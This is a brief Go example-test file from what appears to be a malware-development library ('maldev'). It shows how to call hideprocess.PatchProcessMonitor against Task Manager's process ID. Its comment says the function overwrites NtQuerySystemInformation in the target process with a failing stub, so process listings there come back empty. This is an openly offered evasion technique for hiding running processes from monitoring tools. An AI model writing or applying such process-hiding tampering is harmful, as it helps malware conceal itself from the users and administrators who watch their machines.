//go:build windows

package hideprocess_test

import (
	"github.com/oioio-space/maldev/process/tamper/hideprocess"
)

// PatchProcessMonitor overwrites NtQuerySystemInformation in
// the target process with a stub that returns
// STATUS_NOT_IMPLEMENTED. Subsequent enumeration calls inside
// the target return empty.
func ExamplePatchProcessMonitor() {
	const taskmgrPID = 1234
	if err := hideprocess.PatchProcessMonitor(taskmgrPID, nil); err != nil {
		return
	}
}
